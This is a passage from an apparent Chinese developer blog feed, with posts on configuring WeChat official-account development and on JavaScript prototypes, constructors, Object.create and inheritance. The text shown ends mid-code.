        <content type="html"><![CDATA[<p>现在经济不景气，小公司拿不到投资，连iOS开发和andriod开发都招不起，而微信凭借着众多的用户，成为了开发的热土，一个创业公司可以没有App，但一定会需要先在微信里试水，是公司获客的最佳渠道。</p><p>这个系列记录了微信开发遇到的问题，和产品狗相爱相杀的往事。</p><a id="more"></a><p>目录（也是产品狗的那些呐喊）：</p><p>0.开发前的了解</p><p>1.我想要在微信的H5页面里直接打开小程序</p><p>2.我想要做活动页分享给好友</p><p>3.我想小程序和webview的登录态互相传递</p><p>…</p><h4 id="关于H5的那些争执"><a href="#关于H5的那些争执" class="headerlink" title="关于H5的那些争执"></a>关于H5的那些争执</h4><p>H5，在我们大前端眼中实际是HTML5的缩写，其实HTML已经是缩写了，缩完再缩，就变成了他们口中的H5，实际上只有中国人才会这么称呼，要是跟老外说H5，H five，他们就懵逼了。</p><p>比如App，并不是任何词组的缩写，而是Application的简读，只有中国人才会读APP。还有那个UGG的鞋子，实际上应该念‘阿哥’，但是呢，你开心就好。嗯，啥时候出一个程序员英语装逼指南应该会更受欢迎吧。</p><p>说回H5，对于FE来说，HTML5只不过是一种语言而已。</p><p>对于PM还有其他非前端的开发人员来说，H5指的是手机端上的网页。</p><p>对于运营妹子来说，嗯，H5呀，我也会做哦。实际上他们说的是，可以拖拖拽拽，像做PPT一样生成的页面，便于在微信里快速传播。</p><p>虽然他们说的都不对，但他们开心就好，能听懂就好。</p><h4 id="关于微信公众平台和开放平台"><a href="#关于微信公众平台和开放平台" class="headerlink" title="关于微信公众平台和开放平台"></a>关于微信公众平台和开放平台</h4><p>公众平台：<a href="https://mp.weixin.qq.com/" target="_blank" rel="noopener">https://mp.weixin.qq.com/</a> 主要用在公众号，运营妹子登的多，我们需要开发微信公众号的一些活动页面时也需要在里面配置一些东西</p><p>开放平台：<a href="https://open.weixin.qq.com/" target="_blank" rel="noopener">https://open.weixin.qq.com/</a> 主要用在各种开发上，app，小程序，公众号都包括</p><h4 id="开发公众号页面的配置"><a href="#开发公众号页面的配置" class="headerlink" title="开发公众号页面的配置"></a>开发公众号页面的配置</h4><p>有的公号后台都是运营或PM来管，都不让我们FE来登录。下面是我们开发必要的一些信息。</p><p><img src="/images/微信公众平台-基本配置.png" alt=""></p><h5 id="首页-gt-开发-gt-基本配置"><a href="#首页-gt-开发-gt-基本配置" class="headerlink" title="首页=&gt;开发=&gt;基本配置"></a>首页=&gt;开发=&gt;基本配置</h5><h6 id="公众号开发信息"><a href="#公众号开发信息" class="headerlink" title="公众号开发信息"></a>公众号开发信息</h6><p>AppId用在很多地方</p><p>AppSecret只能放在服务端，前端代码对攻击者来说完全是透明的，只要是跟AppSecret相关的接口都一定是后端调微信的接口。</p><p>需要添加你的IP在Ip白名单里，这样才可以获取acces_token来测试</p><h6 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h6><p>不要配置这个，以免运营妹子的自动回复没了</p><h6 id="已绑定的微信开放平台帐号"><a href="#已绑定的微信开放平台帐号" class="headerlink" title="已绑定的微信开放平台帐号"></a>已绑定的微信开放平台帐号</h6><p>有用到unionId的话会需要这部分</p><h5 id="首页-gt-开发-gt-开发者工具"><a href="#首页-gt-开发-gt-开发者工具" class="headerlink" title="首页=&gt;开发=&gt;开发者工具"></a>首页=&gt;开发=&gt;开发者工具</h5><p><img src="/images/微信公众平台-开发者工具.png" alt=""></p><p>下载一个微信开发者工具</p><p>开发者工具相关信息：<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1455784140" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1455784140</a></p><p>关注公众平台安全助手</p><p>让管理者开通公号开发者权限</p><p>基本工作完成就可以用开发者工具调试公号页面啦</p><h4 id="完成需求的步骤"><a href="#完成需求的步骤" class="headerlink" title="完成需求的步骤"></a>完成需求的步骤</h4><p>1.当PM抛出一个需求时，我们应该看看<strong>当前的公众号是否有相应的权限</strong>。</p><p>不要设计接口、讨论开发了半天才发现这个公号根本没有这个接口权限。</p><p>登录微信公众平台=&gt;开发=&gt;接口权限</p><p>或者综合的接口权限说明： <a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1433401084" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1433401084</a></p><p>选择设置=&gt;系统代理时，fiddler代理并不能生效。可以选择手动设置代理，ipconfig获取本机ip，ip:8888。</p><h5 id="订阅号和服务号的区别："><a href="#订阅号和服务号的区别：" class="headerlink" title="订阅号和服务号的区别："></a>订阅号和服务号的区别：</h5><p>简言之，订阅号会被收纳起来，服务号推送消息会直接出现的你的消息列表中</p><p>订阅号比如：咪蒙。。。这类写文章的。</p><p>服务号比如：小米商城，招行信用卡，京医通等等。</p><p>其他的区别参见：<br><a href="https://www.zhihu.com/question/21289814" target="_blank" rel="noopener">https://www.zhihu.com/question/21289814</a></p><p>2.思索一下在生活中有没有看到过类似的别人完成的需求。</p><p>PM也是人，他们设计肯定也是看别人发了啥他们也要，他见过的咱们也肯定见过啊，没有见过就让他给找例子。</p><p>3.在chrome中打开链接，F12看下源码</p><p>反正咱们前端都是小透明，如果运气好没压缩的话，很easy就可以看懂了。</p><p>其实最大的问题是刚开始因为刚上手，不太明确前端和后端的职责，看看别人页面的network就可以胸有成竹的指使后端我需要这个你得给我返回啦~</p><p>有套路，不迷路。</p><h4 id="经常需要查看的文档们，google不如看文档："><a href="#经常需要查看的文档们，google不如看文档：" class="headerlink" title="经常需要查看的文档们，google不如看文档："></a>经常需要查看的文档们，google不如看文档：</h4><p>公众平台综合技术文档：<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1472017492_58YV5" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1472017492_58YV5</a></p><p>JS-SDK：<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421141115" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421141115</a></p><p>JS接口签名校验工具：<a href="https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=jsapisign&amp;token=&amp;lang=zh_CN" target="_blank" rel="noopener">https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=jsapisign&amp;token=⟨=zh_CN</a></p><p>接口调试工具：<a href="https://mp.weixin.qq.com/debug?token=1156200581&amp;lang=zh_CN" target="_blank" rel="noopener">https://mp.weixin.qq.com/debug?token=1156200581⟨=zh_CN</a></p><p>获取JSTicket：<a href="https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token={Access_TOKEN}&amp;type=jsapi" target="_blank" rel="noopener">https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token={Access_TOKEN}&amp;type=jsapi</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 微信开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JS中的面向对象5-Object.create和new Object</title>
      <link href="/2018/07/18/jsoo_object_create/"/>
      <url>/2018/07/18/jsoo_object_create/</url>
      
        <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Person = <span class="function"><span class="keyword">function</span>(<span class="params">age</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.age=age;</span><br><span class="line">    <span class="keyword">this</span>.say=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="string">'hello'</span>);&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> p=<span class="keyword">new</span> Person(<span class="number">11</span>);</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="built_in">Object</span>.create(p);</span><br></pre></td></tr></table></figure><p><img src="/images/proto1.png" alt=""></p><p><img src="/images/proto2.png" alt=""></p><p>从console中可以发现，p成了p1的原型对象，p中的属性和方法都成了p1的原型方法。</p><p>Object.create的作用就是传入一个对象，给创建的新对象提供<code>__proto__</code>引用</p><p>多用在对象的继承中。</p><p>Object.create的实现方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">Object</span>.create) &#123;</span><br><span class="line">  <span class="built_in">Object</span>.create = <span class="function"><span class="keyword">function</span>(<span class="params">proto, propertiesObject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> proto !== <span class="string">'object'</span> &amp;&amp; <span class="keyword">typeof</span> proto !== <span class="string">'function'</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Object prototype may only be an Object:'</span> + proto);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (proto === <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"This browser's implementation of Object.create is a shim and doesn't support 'null'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> propertiesObject != <span class="string">'undefined'</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"This browser's implementation of Object.create is a shim and doesn't support a second argument"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    F.prototype = proto;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JS中的面向对象4-继承的实现</title>
      <link href="/2018/07/15/jsoo_inherit/"/>
      <url>/2018/07/15/jsoo_inherit/</url>
      
        <content type="html"><![CDATA[<p>理解了基本发展历史和深层原理，接下来就是生生不息的原因，继承部分啦。<br><a id="more"></a></p><p>我们知道JS是单继承的，Object.prototype是原型链的顶端，所有对象从它继承了包括toString等方法和属性。</p><p>Object本身是类当然也是构造函数，构造函数嘛当然是继承自Function.prototype</p><p>而Function也是对象，继承自Object.prototype。</p><p>这里就有一个鸡和蛋的问题：到底是先有Object还是先有Function。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span> <span class="keyword">instanceof</span> <span class="built_in">Function</span> <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Function</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Function</span>.prototype===<span class="built_in">Function</span>.__proto__ <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.__proto__ === <span class="literal">null</span> <span class="comment">// true 说明原型链到Object.prototype终止。</span></span><br></pre></td></tr></table></figure><p>上篇中我们了解到原型链是实现继承的主要方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.property = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype = &#123;</span><br><span class="line">  <span class="keyword">constructor</span>: SubType,</span><br><span class="line">  getSuperVal: function() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.property;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.subProperty = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = <span class="keyword">new</span> SuperType(); <span class="comment">// 重点</span></span><br><span class="line">SubType.property.getSubVal = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.subProperty;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sub1 = <span class="keyword">new</span> SubType();</span><br><span class="line">sub1.getSuperVal(); <span class="comment">// true</span></span><br><span class="line">sub1.getSubVal(); <span class="comment">// false</span></span><br><span class="line">sub1 <span class="keyword">instanceof</span> SubType; <span class="comment">// true</span></span><br><span class="line">sub1 <span class="keyword">instanceof</span> SuperType; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>回顾下new的作用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> instance=<span class="keyword">new</span> Person();</span><br><span class="line"><span class="comment">// 实际经历了如下四步：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.创建空对象</span></span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.设置原型链，指向类【构造函数】的原型</span></span><br><span class="line">instance.__proto__ = Person.prototype;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.让构造函数Person的this指向实例instance,执行构造函数Person的函数体</span></span><br><span class="line"><span class="keyword">var</span> p = Person.call(instance);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.判断Person的返回值类型</span></span><br><span class="line"><span class="comment">// 值类型就不要了，还是返回instance</span></span><br><span class="line"><span class="comment">// 如果是引用类型，替换掉instance返回引用类型</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> p ==<span class="string">'object'</span>)&#123;</span><br><span class="line"> <span class="keyword">return</span> p </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以上文中重点new实现了如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SubType.prototype.__proto__ = SuperType.prototype;</span><br><span class="line">SuperType.call(SubType.prototype);</span><br><span class="line"><span class="keyword">var</span> Animal = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.wow = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name + <span class="string">':wow'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Dog = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.run = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name + <span class="string">':run'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Dog.prototype = <span class="keyword">new</span> Animal(); <span class="comment">// 继承的实现：将父类原型指向子类</span></span><br><span class="line">Dog.prototype=Animal.prototype; <span class="comment">// 为啥不是这样？</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JS中的面向对象3-原型和构造函数的关系</title>
      <link href="/2018/06/30/jsoo_prototype_constructor/"/>
      <url>/2018/06/30/jsoo_prototype_constructor/</url>
      
        <content type="html"><![CDATA[<p>本系列是学习整理js中的面向对象的第3篇，原型和构造函数的关系，接下来就要更深入的探究其中的原理了。<br><a id="more"></a></p><h4 id="原型和构造函数到底有什么关系？"><a href="#原型和构造函数到底有什么关系？" class="headerlink" title="原型和构造函数到底有什么关系？"></a>原型和构造函数到底有什么关系？</h4><p><img src="/images/proto3.png" alt=""></p><p>构造函数有原型对象，Person.prototype，此对象中有属性constructor，指向了构造函数Person，构造函数又有原型…</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype.constructor===Person;<span class="comment">//true</span></span><br><span class="line">Person.prototype.constructor.prototype.constructor.prototype===Person.prototype; <span class="comment">// true 两者相依相存</span></span><br></pre></td></tr></table></figure><p>构造函数是为了方便创建对象。</p><p>构造函数通过prototype来存储要共享的属性和方法。</p><h4 id="prototype和-proto-（-Prototype-）又有什么关系？"><a href="#prototype和-proto-（-Prototype-）又有什么关系？" class="headerlink" title="prototype和__proto__（[[Prototype]]）又有什么关系？"></a>prototype和__proto__（[[Prototype]]）又有什么关系？</h4><p><strong>类和构造函数</strong>：比如Array你可以看做一个类，也可以看成是Array的构造函数。</p><p><code>__proto__</code>:是<strong>实例</strong>的属性，指向构造函数的原型 constructor.prototype，每个对象都有。所以我们暂且称它为原型引用。</p><p><code>prototype</code>:原型对象，只有函数才有prototype，所以<strong>原型是构造函数（类）的原型</strong>。</p><p>我们先来回忆下new操作符到底做了什么【参见js中的面向对象2】。</p><p>就是new操作符实现了实例的<code>__proto__</code>指向类的原型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// __proto__是new出来的实例内部包含的一个指针，指向constructor.prototype。每个对象都有</span></span><br><span class="line">p.__proto__ === Person.prototype <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">p.prototype <span class="comment">// undefined 只有函数才有prototype</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(p)=== p.__proto__===Person.prototype <span class="comment">// Object.getPrototypeOf得到实例的__proto__</span></span><br><span class="line"><span class="comment">// 字面意思是获取实例的原型prototype，实际是获取原型的引用。</span></span><br><span class="line"><span class="comment">// 因为实例没有原型，只有原型引用__proto__，类（构造函数）才有原型prototype</span></span><br><span class="line"></span><br><span class="line">Person.prototype.isPrototypeOf(p) <span class="comment">// true isPrototypeOf 原型对象是构造函数的原型</span></span><br></pre></td></tr></table></figure><h4 id="prototype和实例又有什么关系呢？"><a href="#prototype和实例又有什么关系呢？" class="headerlink" title="prototype和实例又有什么关系呢？"></a>prototype和实例又有什么关系呢？</h4><p>prototype是用来保存类的公共属性和方法的，其实也是个特殊的对象，可以理解为和实例是一个level的。但是他们之间有什么关系和区别呢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 联系</span></span><br><span class="line">p.constructor === Person.prototype.constructor === Person; <span class="comment">// true 两者具有相同的构造函数</span></span><br><span class="line"></span><br><span class="line">p.__proto__ === Person.prototype; <span class="comment">// true 实例的原型引用指向了原型对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 区别</span></span><br><span class="line">Person.prototype.__proto__===Person.prototype; <span class="comment">// flase 原型的原型引用不再是原型对象啦</span></span><br></pre></td></tr></table></figure><p>既然是一个level为啥不相等呢？因为原型肩负了继承的重要责任。</p><p>正是通过<code>Person.prototype.__proto__.__proto__.__proto__.__proto__.__proto__</code>来一层层向上查找父类，这就是所谓的<strong>原型链</strong></p><p>所以继承的写法就是</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype=<span class="keyword">new</span> Parent();</span><br></pre></td></tr></table></figure><p>结合前面new的作用，可以明白此处实际上的最重要的作用就是</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype.__proto__=Parent.prototype;<span class="comment">// 将原型引用指向父类的原型</span></span><br><span class="line"><span class="comment">// Person.__proto__总是指向父类</span></span><br></pre></td></tr></table></figure><p>调用p.name时，会从p自身的属性中寻找是否有name，没有则到p对应的原型中寻找<br><code>obj.__proto__.__proto__.__proto__</code>形成原型链，可以通过instanceof来验证obj是否是构造函数（类）的实例</p><p>继承的细节将在下节来详细解释</p><h4 id="Object和Function的关系及特殊的原型对象"><a href="#Object和Function的关系及特殊的原型对象" class="headerlink" title="Object和Function的关系及特殊的原型对象"></a>Object和Function的关系及特殊的原型对象</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1= &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj2= <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">obj1.__proto__ === <span class="built_in">Object</span>.prototype <span class="comment">// true 指向构造函数的原型</span></span><br><span class="line">obj2.__proto__ === <span class="built_in">Object</span>.prototype <span class="comment">// true</span></span><br><span class="line">obj1.toString === <span class="built_in">Object</span>.prototype.toString === obj2.__proto__.toString <span class="comment">// true 调用实例方法实际上是调用原型的方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn1=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> fn2=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">fn1.constructor===<span class="built_in">Function</span></span><br><span class="line">fn1.__proto__===<span class="built_in">Function</span>.prototype </span><br><span class="line">fn1__proto__===fn2.__proto__ <span class="comment">// true </span></span><br><span class="line"></span><br><span class="line">fn1.prototype.constructor=fn1;</span><br><span class="line">fn1.prototype.constructor.name <span class="comment">// fn1</span></span><br><span class="line">fn2.prototype.constructor.name <span class="comment">// fn2</span></span><br><span class="line">fn1.prototype===fn2.prototype <span class="comment">// false </span></span><br><span class="line">fn1.prototype===&#123;</span><br><span class="line">    <span class="comment">// fn1</span></span><br><span class="line">    <span class="keyword">constructor</span>:function()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// 指向了Object.prototype</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn1.prototype.__proto__ === <span class="built_in">Object</span>.prototype</span><br><span class="line"><span class="comment">// 所以Function 继承自Object</span></span><br></pre></td></tr></table></figure><h4 id="原型的相关方法"><a href="#原型的相关方法" class="headerlink" title="原型的相关方法"></a>原型的相关方法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getPrototypeOf(p) === Person.prototype; <span class="comment">// true</span></span><br><span class="line">Person.prototype.isPrototypeOf(p); <span class="comment">// true</span></span><br><span class="line">p.hasOwnProperty(<span class="string">'name'</span>); <span class="comment">// false 是原型属性</span></span><br><span class="line">p.salary = <span class="number">25000</span>;</span><br><span class="line">p.hasOwnProperty(<span class="string">'salary'</span>); <span class="comment">// true 是实例属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过in操作符和hasOwnProperty可以判断属性到底是在实例还是原型中</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasPrototypeProperty</span>(<span class="params">obj, name</span>) </span>&#123; <span class="comment">// 判断是否是原型属性</span></span><br><span class="line">  <span class="keyword">return</span> !obj.hasOwnProperty(name) &amp;&amp; (name <span class="keyword">in</span> obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 因为in操作符包括原型属性，所以在遍历时eslint不建议使用for-in，如果必须使用也需要用hasOwnProperty来过滤下</span></span><br><span class="line"></span><br><span class="line">p <span class="keyword">instanceof</span> Person; <span class="comment">// true 实例是否是类的实例</span></span><br></pre></td></tr></table></figure><h4 id="基本类型判断"><a href="#基本类型判断" class="headerlink" title="基本类型判断"></a>基本类型判断</h4><p>但是instanceof也有力不从心的时候，回忆下我们判断isArray，isDate等类型的方法，instanceof假定只有一个全局作用域，在页面中有多个frame时，存在两个以上的全局执行环境，一个框架向另一个框架传值时，会有不一样的构造函数。建议使用以下方式来判断。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isType</span>(<span class="params">type</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">obj</span> =&gt;</span> <span class="built_in">Object</span>.prototype.toString.call(obj) === <span class="string">`[object <span class="subst">$&#123;type&#125;</span>]`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isObject = isType(<span class="string">'Object'</span>);</span><br><span class="line"><span class="keyword">const</span> isString = isType(<span class="string">'String'</span>);</span><br><span class="line"><span class="keyword">const</span> isArray = <span class="built_in">Array</span>.isArray || isType(<span class="string">'Array'</span>);</span><br><span class="line"><span class="keyword">const</span> isFunction = isType(<span class="string">'Function'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; isObject, isString, isArray, isFunction &#125;;</span><br><span class="line"><span class="comment">// toString只能通过Object.prototype.toString.call来调用才能判断类型</span></span><br></pre></td></tr></table></figure><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">age, name, friends</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.friends = friends;</span><br><span class="line">  <span class="comment">// 只在初始化时判断，不需要把每个方法都判断TODO</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span>.sayName != <span class="string">'function'</span>) &#123;</span><br><span class="line">    